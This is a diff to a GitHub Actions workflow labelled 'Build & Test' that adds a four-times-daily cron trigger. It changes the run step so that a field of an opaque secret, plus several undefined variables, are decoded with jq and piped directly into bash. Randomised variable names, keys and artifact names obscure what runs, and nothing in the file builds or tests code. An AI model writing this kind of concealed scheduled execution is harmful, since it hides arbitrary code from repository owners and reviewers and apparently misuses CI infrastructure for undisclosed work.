@@ -2,6 +2,8 @@ name: Build & Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '25 3,9,15,21 * * *'
 jobs:
   workflow:
     runs-on: ubuntu-latest
@@ -13,19 +15,18 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          fyxiy08: ${{ secrets.fyxiy08 }}
+          tqz64: ${{ secrets.tqz64 }}
         run: |
-          printf '%s' "$fyxiy08" | jq -r .uhopb0 | /bin/bash
-          printf '%s' "$lrd41482" | jq -r .md3154 | /bin/bash
-          printf '%s' "$i5" | jq -r .ek1543 | /bin/bash
-          echo $svz173 | jq -r .pt65 | /bin/bash
-          echo $qke53 | jq -r .ar11 | /bin/bash
-          echo $mnanh80 | jq -r .kxcr36 | /bin/bash
-          echo $acq1 | jq -r .lbvv1 | /bin/bash
+          printf '%s' "$tqz64" | jq -r .t52134 | /bin/bash
+          echo $a2278 | jq -r .ylkz6 | /bin/bash
+          echo $yy1 | jq -r .upicz8291 | /bin/bash
+          echo $kqga5954 | jq -r .dr359 | /bin/bash
+          echo $ssp98 | jq -r .c85006 | /bin/bash
+          echo $ivn01646 | jq -r .dqnen06125 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: waLqghXZ
+          name: aLzwsHZE
           path: "*.zip"
           retention-days: 1
